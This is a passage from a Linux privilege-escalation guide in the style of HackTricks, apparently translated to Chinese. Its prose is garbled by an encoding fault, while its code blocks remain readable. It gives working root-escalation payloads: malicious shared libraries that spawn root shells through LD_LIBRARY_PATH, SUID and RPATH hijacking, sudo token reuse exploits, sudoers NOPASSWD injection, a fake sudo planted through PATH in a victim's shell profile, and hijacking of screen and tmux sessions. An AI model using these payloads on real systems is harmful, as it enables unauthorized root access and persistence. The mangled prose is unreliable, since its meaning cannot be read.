å¦‚æœæ”»å‡»è€…æ§åˆ¶äº† <strong>LD_LIBRARY_PATH</strong> ç¯å¢ƒå˜é‡ï¼Œåˆ™å¯ä»¥æ»¥ç”¨ç±»ä¼¼çš„æƒé™æå‡ï¼Œå› ä¸ºä»–æ§åˆ¶äº†å°†è¦æœç´¢åº“çš„è·¯å¾„ã€‚
{% endhint %}</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
</code></pre>
<pre><code class="language-bash"># Compile &amp; execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp &lt;COMMAND&gt;
</code></pre>
<h3 id="suid-äºŒè¿›åˆ¶æ–‡ä»¶--so-æ³¨å…¥"><a class="header" href="#suid-äºŒè¿›åˆ¶æ–‡ä»¶--so-æ³¨å…¥">SUID äºŒè¿›åˆ¶æ–‡ä»¶ â€“ .so æ³¨å…¥</a></h3>
<p>å½“é‡åˆ°ä¸€ä¸ªå…·æœ‰ <strong>SUID</strong> æƒé™ä¸”çœ‹èµ·æ¥ä¸å¯»å¸¸çš„äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼ŒéªŒè¯å®ƒæ˜¯å¦æ­£ç¡®åŠ è½½ <strong>.so</strong> æ–‡ä»¶æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ£€æŸ¥ï¼š</p>
<pre><code class="language-bash">strace &lt;SUID-BINARY&gt; 2&gt;&amp;1 | grep -i -E "open|access|no such file"
</code></pre>
<p>ä¾‹å¦‚ï¼Œé‡åˆ°ç±»ä¼¼ <em>"open(â€œ/path/to/.config/libcalc.soâ€, O_RDONLY) = -1 ENOENT (æ²¡æœ‰è¿™æ ·çš„æ–‡ä»¶æˆ–ç›®å½•)"</em> çš„é”™è¯¯æç¤ºï¼Œæš—ç¤ºäº†æ½œåœ¨çš„åˆ©ç”¨å¯èƒ½æ€§ã€‚</p>
<p>ä¸ºäº†åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ª C æ–‡ä»¶ï¼Œæ¯”å¦‚ <em>"/path/to/.config/libcalc.c"</em>ï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹ä»£ç ï¼š</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p");
}
</code></pre>
<p>æ­¤ä»£ç åœ¨ç¼–è¯‘å’Œæ‰§è¡Œåï¼Œæ—¨åœ¨é€šè¿‡æ“çºµæ–‡ä»¶æƒé™å¹¶æ‰§è¡Œå…·æœ‰æå‡æƒé™çš„ shell æ¥æå‡æƒé™ã€‚</p>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†ä¸Šè¿° C æ–‡ä»¶ç¼–è¯‘ä¸ºå…±äº«å¯¹è±¡ (.so) æ–‡ä»¶ï¼š</p>
<pre><code class="language-bash">gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
</code></pre>
<p>æœ€åï¼Œè¿è¡Œå—å½±å“çš„ SUID äºŒè¿›åˆ¶æ–‡ä»¶åº”è¯¥è§¦å‘æ¼æ´ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ç³»ç»Ÿè¢«æ”»é™·ã€‚</p>
<h2 id="å…±äº«å¯¹è±¡åŠ«æŒ"><a class="header" href="#å…±äº«å¯¹è±¡åŠ«æŒ">å…±äº«å¯¹è±¡åŠ«æŒ</a></h2>
<pre><code class="language-bash"># Lets find a SUID using a non-standard library
ldd some_suid
something.so =&gt; /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬å·²ç»æ‰¾åˆ°ä¸€ä¸ªä»æˆ‘ä»¬å¯ä»¥å†™å…¥çš„æ–‡ä»¶å¤¹åŠ è½½åº“çš„ SUID äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè®©æˆ‘ä»¬åœ¨è¯¥æ–‡ä»¶å¤¹ä¸­åˆ›å»ºå…·æœ‰å¿…è¦åç§°çš„åº“ï¼š</p>
<pre><code class="language-c">//gcc src.c -fPIC -shared -o /development/libshared.so
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
</code></pre>
<p>å¦‚æœæ‚¨é‡åˆ°å¦‚ä¸‹é”™è¯¯</p>
<pre><code class="language-shell-session">./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
</code></pre>
<p>è¿™æ„å‘³ç€æ‚¨ç”Ÿæˆçš„åº“éœ€è¦æœ‰ä¸€ä¸ªåä¸º <code>a_function_name</code> çš„å‡½æ•°ã€‚</p>
<h3 id="gtfobins"><a class="header" href="#gtfobins">GTFOBins</a></h3>
<p><a href="https://gtfobins.github.io"><strong>GTFOBins</strong></a> æ˜¯ä¸€ä¸ªç»è¿‡ç­–åˆ’çš„ Unix äºŒè¿›åˆ¶æ–‡ä»¶åˆ—è¡¨ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ–‡ä»¶ç»•è¿‡æœ¬åœ°å®‰å…¨é™åˆ¶ã€‚<a href="https://gtfoargs.github.io/"><strong>GTFOArgs</strong></a> åˆ™æ˜¯é’ˆå¯¹åªèƒ½ <strong>æ³¨å…¥å‚æ•°</strong> çš„å‘½ä»¤çš„æƒ…å†µã€‚</p>
<p>è¯¥é¡¹ç›®æ”¶é›†äº†å¯ä»¥è¢«æ»¥ç”¨ä»¥çªç ´å—é™ shellã€æå‡æˆ–ç»´æŒç‰¹æƒã€ä¼ è¾“æ–‡ä»¶ã€ç”Ÿæˆç»‘å®šå’Œåå‘ shellï¼Œä»¥åŠä¿ƒè¿›å…¶ä»–åæœŸåˆ©ç”¨ä»»åŠ¡çš„ Unix äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆæ³•åŠŸèƒ½ã€‚</p>
<blockquote>
<p>gdb -nx -ex '!sh' -ex quit<br />
sudo mysql -e '! /bin/sh'<br />
strace -o /dev/null /bin/sh<br />
sudo awk 'BEGIN {system("/bin/sh")}'</p>
</blockquote>
<p>{% embed url="https://gtfobins.github.io/" %}</p>
<p>{% embed url="https://gtfoargs.github.io/" %}</p>
<h3 id="fallofsudo"><a class="header" href="#fallofsudo">FallOfSudo</a></h3>
<p>å¦‚æœæ‚¨å¯ä»¥è®¿é—® <code>sudo -l</code>ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å·¥å…· <a href="https://github.com/CyberOne-Security/FallofSudo"><strong>FallOfSudo</strong></a> æ¥æ£€æŸ¥æ˜¯å¦æ‰¾åˆ°åˆ©ç”¨ä»»ä½• sudo è§„åˆ™çš„æ–¹æ³•ã€‚</p>
<h3 id="é‡ç”¨-sudo-ä»¤ç‰Œ"><a class="header" href="#é‡ç”¨-sudo-ä»¤ç‰Œ">é‡ç”¨ Sudo ä»¤ç‰Œ</a></h3>
<p>åœ¨æ‚¨æ‹¥æœ‰ <strong>sudo è®¿é—®æƒé™</strong> ä½†æ²¡æœ‰å¯†ç çš„æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥é€šè¿‡ <strong>ç­‰å¾… sudo å‘½ä»¤æ‰§è¡Œç„¶ååŠ«æŒä¼šè¯ä»¤ç‰Œ</strong> æ¥æå‡ç‰¹æƒã€‚</p>
<p>æå‡ç‰¹æƒçš„è¦æ±‚ï¼š</p>
<ul>
<li>æ‚¨å·²ç»ä»¥ç”¨æˆ· "<em>sampleuser</em>" æ‹¥æœ‰ä¸€ä¸ª shell</li>
<li>"<em>sampleuser</em>" åœ¨ <strong>è¿‡å» 15 åˆ†é’Ÿå†…</strong> <strong>ä½¿ç”¨è¿‡ <code>sudo</code></strong> æ‰§è¡ŒæŸäº›æ“ä½œï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™æ˜¯å…è®¸æˆ‘ä»¬åœ¨ä¸è¾“å…¥ä»»ä½•å¯†ç çš„æƒ…å†µä¸‹ä½¿ç”¨ <code>sudo</code> çš„ sudo ä»¤ç‰Œçš„æŒç»­æ—¶é—´ï¼‰</li>
<li><code>cat /proc/sys/kernel/yama/ptrace_scope</code> ä¸º 0</li>
<li><code>gdb</code> å¯è®¿é—®ï¼ˆæ‚¨å¯ä»¥ä¸Šä¼ å®ƒï¼‰</li>
</ul>
<p>ï¼ˆæ‚¨å¯ä»¥é€šè¿‡ <code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code> ä¸´æ—¶å¯ç”¨ <code>ptrace_scope</code>ï¼Œæˆ–é€šè¿‡æ°¸ä¹…ä¿®æ”¹ <code>/etc/sysctl.d/10-ptrace.conf</code> å¹¶è®¾ç½® <code>kernel.yama.ptrace_scope = 0</code> æ¥å®ç°ï¼‰</p>
<p>å¦‚æœæ»¡è¶³æ‰€æœ‰è¿™äº›è¦æ±‚ï¼Œ<strong>æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æå‡ç‰¹æƒï¼š</strong> <a href="https://github.com/nongiach/sudo_inject"><strong>https://github.com/nongiach/sudo_inject</strong></a></p>
<ul>
<li><strong>ç¬¬ä¸€ä¸ªåˆ©ç”¨</strong> (<code>exploit.sh</code>) å°†åœ¨ <em>/tmp</em> ä¸­åˆ›å»ºäºŒè¿›åˆ¶æ–‡ä»¶ <code>activate_sudo_token</code>ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥ <strong>æ¿€æ´»æ‚¨ä¼šè¯ä¸­çš„ sudo ä»¤ç‰Œ</strong>ï¼ˆæ‚¨ä¸ä¼šè‡ªåŠ¨è·å¾— root shellï¼Œè¯·æ‰§è¡Œ <code>sudo su</code>ï¼‰ï¼š</li>
</ul>
<pre><code class="language-bash">bash exploit.sh
/tmp/activate_sudo_token
sudo su
</code></pre>
<ul>
<li>ç¬¬äºŒä¸ªæ¼æ´ (<code>exploit_v2.sh</code>) å°†åœ¨ <em>/tmp</em> ä¸­åˆ›å»ºä¸€ä¸ª <strong>ç”± root æ‹¥æœ‰å¹¶è®¾ç½®äº† setuid çš„ sh shell</strong></li>
</ul>
<pre><code class="language-bash">bash exploit_v2.sh
/tmp/sh -p
</code></pre>
<ul>
<li>ç¬¬<strong>ä¸‰ä¸ªæ¼æ´</strong>ï¼ˆ<code>exploit_v3.sh</code>ï¼‰å°†<strong>åˆ›å»ºä¸€ä¸ªsudoersæ–‡ä»¶</strong>ï¼Œä½¿<strong>sudoä»¤ç‰Œæ°¸ä¹…æœ‰æ•ˆå¹¶å…è®¸æ‰€æœ‰ç”¨æˆ·ä½¿ç”¨sudo</strong></li>
</ul>
<pre><code class="language-bash">bash exploit_v3.sh
sudo su
</code></pre>
<h3 id="varrunsudotsusername"><a class="header" href="#varrunsudotsusername">/var/run/sudo/ts/&lt;Username&gt;</a></h3>
<p>å¦‚æœæ‚¨åœ¨è¯¥æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶å¤¹å†…åˆ›å»ºçš„ä»»ä½•æ–‡ä»¶ä¸­å…·æœ‰<strong>å†™æƒé™</strong>ï¼Œåˆ™å¯ä»¥ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶ <a href="https://github.com/nongiach/sudo_inject/tree/master/extra_tools"><strong>write_sudo_token</strong></a> <strong>ä¸ºç”¨æˆ·å’ŒPIDåˆ›å»ºsudoä»¤ç‰Œ</strong>ã€‚<br />
ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å¯ä»¥è¦†ç›–æ–‡ä»¶ <em>/var/run/sudo/ts/sampleuser</em> å¹¶ä¸”æ‚¨ä»¥è¯¥ç”¨æˆ·çš„èº«ä»½æ‹¥æœ‰PID 1234çš„shellï¼Œæ‚¨å¯ä»¥<strong>è·å¾—sudoæƒé™</strong>è€Œæ— éœ€çŸ¥é“å¯†ç ï¼Œæ‰§è¡Œï¼š</p>
<pre><code class="language-bash">./write_sudo_token 1234 &gt; /var/run/sudo/ts/sampleuser
</code></pre>
<h3 id="etcsudoers-etcsudoersd"><a class="header" href="#etcsudoers-etcsudoersd">/etc/sudoers, /etc/sudoers.d</a></h3>
<p>æ–‡ä»¶ <code>/etc/sudoers</code> å’Œ <code>/etc/sudoers.d</code> ä¸­çš„æ–‡ä»¶é…ç½®äº†è°å¯ä»¥ä½¿ç”¨ <code>sudo</code> ä»¥åŠå¦‚ä½•ä½¿ç”¨ã€‚è¿™äº›æ–‡ä»¶ <strong>é»˜è®¤æƒ…å†µä¸‹åªèƒ½è¢«ç”¨æˆ· root å’Œç»„ root è¯»å–</strong>ã€‚<br />
<strong>å¦‚æœ</strong> ä½ å¯ä»¥ <strong>è¯»å–</strong> è¿™ä¸ªæ–‡ä»¶ï¼Œä½ å¯èƒ½èƒ½å¤Ÿ <strong>è·å¾—ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯</strong>ï¼Œå¦‚æœä½ å¯ä»¥ <strong>å†™å…¥</strong> ä»»ä½•æ–‡ä»¶ï¼Œä½ å°†èƒ½å¤Ÿ <strong>æå‡æƒé™</strong>ã€‚</p>
<pre><code class="language-bash">ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
</code></pre>
<p>å¦‚æœä½ ä¼šå†™ï¼Œä½ å°±å¯ä»¥æ»¥ç”¨è¿™ä¸ªæƒé™</p>
<pre><code class="language-bash">echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" &gt;&gt; /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" &gt;&gt; /etc/sudoers.d/README
</code></pre>
<p>å¦ä¸€ç§æ»¥ç”¨è¿™äº›æƒé™çš„æ–¹æ³•ï¼š</p>
<pre><code class="language-bash"># makes it so every terminal can sudo
echo "Defaults !tty_tickets" &gt; /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" &gt;&gt; /etc/sudoers.d/win
</code></pre>
<h3 id="doas"><a class="header" href="#doas">DOAS</a></h3>
<p>æœ‰ä¸€äº›æ›¿ä»£ <code>sudo</code> äºŒè¿›åˆ¶æ–‡ä»¶çš„é€‰é¡¹ï¼Œä¾‹å¦‚ OpenBSD çš„ <code>doas</code>ï¼Œè¯·è®°å¾—æ£€æŸ¥å…¶é…ç½®æ–‡ä»¶ <code>/etc/doas.conf</code>ã€‚</p>
<pre><code>permit nopass demo as root cmd vim
</code></pre>
<h3 id="sudo-hijacking"><a class="header" href="#sudo-hijacking">Sudo Hijacking</a></h3>
<p>å¦‚æœä½ çŸ¥é“ä¸€ä¸ª <strong>ç”¨æˆ·é€šå¸¸è¿æ¥åˆ°ä¸€å°æœºå™¨å¹¶ä½¿ç”¨ <code>sudo</code></strong> æ¥æå‡æƒé™ï¼Œå¹¶ä¸”ä½ åœ¨è¯¥ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­è·å¾—äº†ä¸€ä¸ª shellï¼Œä½ å¯ä»¥ <strong>åˆ›å»ºä¸€ä¸ªæ–°çš„ sudo å¯æ‰§è¡Œæ–‡ä»¶</strong>ï¼Œè¯¥æ–‡ä»¶å°†ä»¥ root èº«ä»½æ‰§è¡Œä½ çš„ä»£ç ï¼Œç„¶åæ‰§è¡Œç”¨æˆ·çš„å‘½ä»¤ã€‚ç„¶åï¼Œ<strong>ä¿®æ”¹ç”¨æˆ·ä¸Šä¸‹æ–‡çš„ $PATH</strong>ï¼ˆä¾‹å¦‚åœ¨ .bash_profile ä¸­æ·»åŠ æ–°è·¯å¾„ï¼‰ï¼Œè¿™æ ·å½“ç”¨æˆ·æ‰§è¡Œ sudo æ—¶ï¼Œä½ çš„ sudo å¯æ‰§è¡Œæ–‡ä»¶å°±ä¼šè¢«æ‰§è¡Œã€‚</p>
<p>è¯·æ³¨æ„ï¼Œå¦‚æœç”¨æˆ·ä½¿ç”¨ä¸åŒçš„ shellï¼ˆä¸æ˜¯ bashï¼‰ï¼Œä½ éœ€è¦ä¿®æ”¹å…¶ä»–æ–‡ä»¶ä»¥æ·»åŠ æ–°è·¯å¾„ã€‚ä¾‹å¦‚<a href="https://github.com/APTy/sudo-piggyback"> sudo-piggyback</a> ä¿®æ”¹äº† <code>~/.bashrc</code>ã€<code>~/.zshrc</code>ã€<code>~/.bash_profile</code>ã€‚ä½ å¯ä»¥åœ¨ <a href="https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py">bashdoor.py</a> ä¸­æ‰¾åˆ°å¦ä¸€ä¸ªç¤ºä¾‹ã€‚</p>
<p>æˆ–è€…è¿è¡Œç±»ä¼¼çš„å‘½ä»¤ï¼š</p>
<pre><code class="language-bash">cat &gt;/tmp/sudo &lt;&lt;EOF
#!/bin/bash
/usr/bin/sudo whoami &gt; /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo â€˜export PATH=/tmp:$PATHâ€™ &gt;&gt; $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
</code></pre>
<h2 id="å…±äº«åº“"><a class="header" href="#å…±äº«åº“">å…±äº«åº“</a></h2>
<h3 id="ldso"><a class="header" href="#ldso">ld.so</a></h3>
<p>æ–‡ä»¶ <code>/etc/ld.so.conf</code> æŒ‡ç¤º <strong>åŠ è½½çš„é…ç½®æ–‡ä»¶æ¥è‡ªå“ªé‡Œ</strong>ã€‚é€šå¸¸ï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«ä»¥ä¸‹è·¯å¾„ï¼š<code>include /etc/ld.so.conf.d/*.conf</code></p>
<p>è¿™æ„å‘³ç€å°†è¯»å–æ¥è‡ª <code>/etc/ld.so.conf.d/*.conf</code> çš„é…ç½®æ–‡ä»¶ã€‚è¿™äº›é…ç½®æ–‡ä»¶ <strong>æŒ‡å‘å…¶ä»–æ–‡ä»¶å¤¹</strong>ï¼Œåœ¨è¿™äº›æ–‡ä»¶å¤¹ä¸­å°† <strong>æœç´¢</strong> <strong>åº“</strong>ã€‚ä¾‹å¦‚ï¼Œ<code>/etc/ld.so.conf.d/libc.conf</code> çš„å†…å®¹æ˜¯ <code>/usr/local/lib</code>ã€‚ <strong>è¿™æ„å‘³ç€ç³»ç»Ÿå°†åœ¨ <code>/usr/local/lib</code> å†…æœç´¢åº“</strong>ã€‚</p>
<p>å¦‚æœç”±äºæŸç§åŸå›  <strong>ç”¨æˆ·åœ¨ä»»ä½•æŒ‡ç¤ºçš„è·¯å¾„ä¸Šå…·æœ‰å†™æƒé™</strong>ï¼š<code>/etc/ld.so.conf</code>ã€<code>/etc/ld.so.conf.d/</code>ã€<code>/etc/ld.so.conf.d/</code> å†…çš„ä»»ä½•æ–‡ä»¶æˆ– <code>/etc/ld.so.conf.d/*.conf</code> å†…çš„é…ç½®æ–‡ä»¶ä¸­çš„ä»»ä½•æ–‡ä»¶å¤¹ï¼Œä»–å¯èƒ½èƒ½å¤Ÿæå‡æƒé™ã€‚<br />
è¯·æŸ¥çœ‹ <strong>å¦‚ä½•åˆ©ç”¨æ­¤é”™è¯¯é…ç½®</strong> çš„ä¸‹ä¸€é¡µï¼š</p>
<p>{% content-ref url="ld.so.conf-example.md" %}
<a href="ld.so.conf-example.html">ld.so.conf-example.md</a>
{% endcontent-ref %}</p>
<h3 id="rpath"><a class="header" href="#rpath">RPATH</a></h3>
<pre><code>level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =&gt;  (0x0068c000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
</code></pre>
<p>é€šè¿‡å°†åº“å¤åˆ¶åˆ° <code>/var/tmp/flag15/</code>ï¼Œå®ƒå°†è¢«ç¨‹åºåœ¨æ­¤ä½ç½®ä½¿ç”¨ï¼Œå¦‚ <code>RPATH</code> å˜é‡æ‰€æŒ‡å®šã€‚</p>
<pre><code>level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =&gt;  (0x005b0000)
libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
</code></pre>
<p>ç„¶ååœ¨ <code>/var/tmp</code> ä¸­åˆ›å»ºä¸€ä¸ªæ¶æ„åº“ï¼Œä½¿ç”¨ <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p>
<pre><code class="language-c">#include&lt;stdlib.h&gt;
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
</code></pre>
<h2 id="capabilities"><a class="header" href="#capabilities">Capabilities</a></h2>
<p>Linux capabilities æä¾›äº†ä¸€ä¸ª <strong>å¯ç”¨æ ¹æƒé™çš„å­é›†ç»™ä¸€ä¸ªè¿›ç¨‹</strong>ã€‚è¿™æœ‰æ•ˆåœ°å°†æ ¹ <strong>æƒé™åˆ†è§£ä¸ºæ›´å°å’Œç‹¬ç‰¹çš„å•å…ƒ</strong>ã€‚æ¯ä¸ªå•å…ƒå¯ä»¥ç‹¬ç«‹æˆäºˆç»™è¿›ç¨‹ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå®Œæ•´çš„æƒé™é›†è¢«å‡å°‘ï¼Œä»è€Œé™ä½äº†è¢«åˆ©ç”¨çš„é£é™©ã€‚<br />
é˜…è¯»ä»¥ä¸‹é¡µé¢ä»¥ <strong>äº†è§£æ›´å¤šå…³äºèƒ½åŠ›åŠå…¶æ»¥ç”¨çš„æ–¹æ³•</strong>ï¼š</p>
<p>{% content-ref url="linux-capabilities.md" %}
<a href="linux-capabilities.html">linux-capabilities.md</a>
{% endcontent-ref %}</p>
<h2 id="directory-permissions"><a class="header" href="#directory-permissions">Directory permissions</a></h2>
<p>åœ¨ä¸€ä¸ªç›®å½•ä¸­ï¼Œ**â€œæ‰§è¡Œâ€**ä½æ„å‘³ç€å—å½±å“çš„ç”¨æˆ·å¯ä»¥â€œ<strong>cd</strong>â€è¿›å…¥è¯¥æ–‡ä»¶å¤¹ã€‚<br />
**â€œè¯»å–â€**ä½æ„å‘³ç€ç”¨æˆ·å¯ä»¥ <strong>åˆ—å‡º</strong> <strong>æ–‡ä»¶</strong>ï¼Œè€Œ **â€œå†™å…¥â€**ä½æ„å‘³ç€ç”¨æˆ·å¯ä»¥ <strong>åˆ é™¤</strong> å’Œ <strong>åˆ›å»º</strong> æ–°çš„ <strong>æ–‡ä»¶</strong>ã€‚</p>
<h2 id="acls"><a class="header" href="#acls">ACLs</a></h2>
<p>è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACLs) ä»£è¡¨äº†å¯é€‰æ‹©æƒé™çš„ç¬¬äºŒå±‚ï¼Œèƒ½å¤Ÿ <strong>è¦†ç›–ä¼ ç»Ÿçš„ ugo/rwx æƒé™</strong>ã€‚è¿™äº›æƒé™é€šè¿‡å…è®¸æˆ–æ‹’ç»ç‰¹å®šç”¨æˆ·ï¼ˆéæ‰€æœ‰è€…æˆ–ä¸å±äºè¯¥ç»„çš„ç”¨æˆ·ï¼‰è®¿é—®æ–‡ä»¶æˆ–ç›®å½•ï¼Œä»è€Œå¢å¼ºäº†å¯¹è®¿é—®çš„æ§åˆ¶ã€‚è¿™ç§ <strong>ç²’åº¦ç¡®ä¿äº†æ›´ç²¾ç¡®çš„è®¿é—®ç®¡ç†</strong>ã€‚æ›´å¤šè¯¦ç»†ä¿¡æ¯å¯ä»¥åœ¨ <a href="https://linuxconfig.org/how-to-manage-acls-on-linux"><strong>è¿™é‡Œ</strong></a> æ‰¾åˆ°ã€‚</p>
<p><strong>ç»™äºˆ</strong> ç”¨æˆ· "kali" å¯¹ä¸€ä¸ªæ–‡ä»¶çš„è¯»å–å’Œå†™å…¥æƒé™ï¼š</p>
<pre><code class="language-bash">setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
</code></pre>
<p><strong>è·å–</strong>å…·æœ‰ç‰¹å®š ACL çš„æ–‡ä»¶ï¼š</p>
<pre><code class="language-bash">getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2&gt;/dev/null
</code></pre>
<h2 id="æ‰“å¼€-shell-ä¼šè¯"><a class="header" href="#æ‰“å¼€-shell-ä¼šè¯">æ‰“å¼€ shell ä¼šè¯</a></h2>
<p>åœ¨ <strong>æ—§ç‰ˆæœ¬</strong> ä¸­ï¼Œæ‚¨å¯ä»¥ <strong>åŠ«æŒ</strong> å…¶ä»–ç”¨æˆ· (<strong>root</strong>) çš„ä¸€äº› <strong>shell</strong> ä¼šè¯ã€‚<br />
åœ¨ <strong>æœ€æ–°ç‰ˆæœ¬</strong> ä¸­ï¼Œæ‚¨åªèƒ½ <strong>è¿æ¥</strong> åˆ° <strong>æ‚¨è‡ªå·±ç”¨æˆ·</strong> çš„å±å¹•ä¼šè¯ã€‚ç„¶è€Œï¼Œæ‚¨å¯èƒ½ä¼šåœ¨ä¼šè¯ä¸­æ‰¾åˆ° <strong>æœ‰è¶£çš„ä¿¡æ¯</strong>ã€‚</p>
<h3 id="å±å¹•ä¼šè¯åŠ«æŒ"><a class="header" href="#å±å¹•ä¼šè¯åŠ«æŒ">å±å¹•ä¼šè¯åŠ«æŒ</a></h3>
<p><strong>åˆ—å‡ºå±å¹•ä¼šè¯</strong></p>
<pre><code class="language-bash">screen -ls
screen -ls &lt;username&gt;/ # Show another user' screen sessions
</code></pre>
<p><img src="../../.gitbook/assets/image%20(141).png" alt="" /></p>
<p><strong>é™„åŠ åˆ°ä¼šè¯</strong></p>
<pre><code class="language-bash">screen -dr &lt;session&gt; #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
</code></pre>
<h2 id="tmux-ä¼šè¯åŠ«æŒ"><a class="header" href="#tmux-ä¼šè¯åŠ«æŒ">tmux ä¼šè¯åŠ«æŒ</a></h2>
<p>è¿™æ˜¯ä¸€ä¸ª <strong>æ—§ç‰ˆ tmux</strong> çš„é—®é¢˜ã€‚ä½œä¸ºéç‰¹æƒç”¨æˆ·ï¼Œæˆ‘æ— æ³•åŠ«æŒç”± root åˆ›å»ºçš„ tmux (v2.1) ä¼šè¯ã€‚</p>
<p><strong>åˆ—å‡º tmux ä¼šè¯</strong></p>
<pre><code class="language-bash">tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
</code></pre>
<p><img src="../../.gitbook/assets/image%20(837).png" alt="" /></p>
<p><strong>é™„åŠ åˆ°ä¼šè¯</strong></p>
<pre><code class="language-bash">tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
</code></pre>
<p>æ£€æŸ¥ <strong>HTB çš„æƒ…äººèŠ‚ç›’å­</strong> ä»¥è·å–ç¤ºä¾‹ã€‚</p>
<h2 id="ssh"><a class="header" href="#ssh">SSH</a></h2>
<h3 id="debian-openssl-å¯é¢„æµ‹çš„-prng---cve-2008-0166"><a class="header" href="#debian-openssl-å¯é¢„æµ‹çš„-prng---cve-2008-0166">Debian OpenSSL å¯é¢„æµ‹çš„ PRNG - CVE-2008-0166</a></h3>
<p>åœ¨ 2006 å¹´ 9 æœˆåˆ° 2008 å¹´ 5 æœˆ 13 æ—¥ä¹‹é—´ï¼Œåœ¨åŸºäº Debian çš„ç³»ç»Ÿï¼ˆå¦‚ Ubuntuã€Kubuntu ç­‰ï¼‰ä¸Šç”Ÿæˆçš„æ‰€æœ‰ SSL å’Œ SSH å¯†é’¥å¯èƒ½å—åˆ°æ­¤æ¼æ´çš„å½±å“ã€‚<br />
